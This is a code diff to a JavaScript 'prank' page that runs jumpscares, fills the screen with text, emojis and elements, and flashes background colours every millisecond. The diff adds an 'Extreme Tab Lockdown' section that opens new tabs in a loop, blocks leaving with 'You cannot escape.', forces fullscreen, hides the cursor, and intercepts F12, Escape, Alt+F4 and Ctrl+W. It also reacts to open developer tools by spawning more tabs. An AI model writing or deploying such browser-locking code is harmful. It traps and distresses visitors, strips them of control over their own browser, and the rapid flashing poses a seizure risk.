@@ -2,7 +2,6 @@ document.addEventListener('DOMContentLoaded', () => {
     let clickCount = 0;
     let jumpscareTriggered = false;
 
-    // Function to trigger jumpscare burst (videos, images, and sounds)
     function triggerJumpscareBurst() {
         const warningAudio = new Audio('warning.mp3');
         warningAudio.loop = true;
@@ -79,21 +78,15 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function flashRandomColors() {
-        const colors = [
-            '#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff',
-            '#ff8000', '#8000ff', '#00ff80', '#ff0080', '#808080', '#ffcc00'
-        ];
-
-        const flashInterval = 1;
-
+        const colors = ['#ff0000','#00ff00','#0000ff','#ffff00','#ff00ff','#00ffff','#ff8000','#8000ff','#00ff80','#ff0080','#808080','#ffcc00'];
         setInterval(() => {
             const randomColor = colors[Math.floor(Math.random() * colors.length)];
             document.body.style.backgroundColor = randomColor;
-        }, flashInterval);
+        }, 1);
     }
 
     function spamRandomText() {
-        const textArray = ['Help!', 'Why?', 'Get out!', 'RUN!', 'Why are you here?', 'What is happening?'];
+        const textArray = ['Help!','Why?','Get out!','RUN!','Why are you here?','What is happening?'];
         setInterval(() => {
             const text = textArray[Math.floor(Math.random() * textArray.length)];
             const randomX = Math.random() * window.innerWidth;
@@ -102,7 +95,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const span = document.createElement('span');
             span.innerText = text;
             span.style.position = 'absolute';
-            span.style.color = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+            span.style.color = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
             span.style.left = `${randomX}px`;
             span.style.top = `${randomY}px`;
             span.style.fontSize = `${Math.random() * 30 + 10}px`;
@@ -117,7 +110,7 @@ document.addEventListener('DOMContentLoaded', () => {
             button.style.position = 'absolute';
             button.style.left = `${Math.random() * window.innerWidth}px`;
             button.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;
-            button.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+            button.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
             button.style.fontSize = '15px';
             button.style.zIndex = '99999';
             document.body.appendChild(button);
@@ -125,7 +118,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function spamRandomEmojis() {
-        const emojis = ['😊', '😂', '😱', '😈', '🤯', '💀'];
+        const emojis = ['😊','😂','😱','😈','🤯','💀'];
         setInterval(() => {
             const emoji = emojis[Math.floor(Math.random() * emojis.length)];
             const randomX = Math.random() * window.innerWidth;
@@ -149,13 +142,12 @@ document.addEventListener('DOMContentLoaded', () => {
             div.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;
             div.style.width = `${Math.random() * 200 + 50}px`;
             div.style.height = `${Math.random() * 200 + 50}px`;
-            div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+            div.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
             div.style.zIndex = '1';
             document.body.appendChild(div);
         }, 50);
     }
 
-    // Click event
     document.getElementById('prankButton').addEventListener('click', () => {
         clickCount++;
         if (clickCount >= 5) {
@@ -163,35 +155,58 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Start effects
     flashRandomColors();
     spamRandomText();
     spamRandomButtons();
     spamRandomEmojis();
     spamRandomDivs();
 
-    // Ask before leaving AND spawn infinite tabs
-    window.onbeforeunload = function () {
-        // Attempt to open infinite tabs
-        for (let i = 0; i < 3; i++) {
-            window.open(window.location.href, '_blank');
+    // 🚫 Extreme Tab Lockdown Additions
+
+    function openTabs(n = 5) {
+        for (let i = 0; i < n; i++) {
+            const newTab = window.open(window.location.href, '_blank');
+            if (newTab) newTab.blur();
         }
+    }
 
-        return "Don't leave me here!";
-    };
+    setInterval(() => openTabs(3), 3000);
 
-    // Disable right-click
-    document.addEventListener('contextmenu', event => event.preventDefault());
+    window.addEventListener('beforeunload', (e) => {
+        openTabs(5);
+        e.preventDefault();
+        e.returnValue = 'You cannot escape.';
+    });
 
-    // Try to block dev tools (basic attempt)
+    window.addEventListener('unload', () => openTabs(3));
+
     setInterval(() => {
-        const threshold = 160;
+        const el = document.documentElement;
+        if (el.requestFullscreen) el.requestFullscreen();
+    }, 2000);
+
+    document.body.style.cursor = 'none';
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    document.addEventListener('keydown', (e) => {
+        const blockedKeys = ['F12', 'Escape', 'F5'];
         if (
-            window.outerWidth - window.innerWidth > threshold ||
-            window.outerHeight - window.innerHeight > threshold
+            blockedKeys.includes(e.key) ||
+            (e.ctrlKey && e.key.toLowerCase() === 'w') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.altKey && e.key === 'F4')
         ) {
-            alert("NO DEV TOOLS!");
-            window.open(window.location.href, '_blank');
+            e.preventDefault();
+            alert('nope');
+            openTabs(5);
+        }
+    });
+
+    setInterval(() => {
+        if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+            alert('devtools detected!');
+            openTabs(5);
         }
     }, 1000);
 });
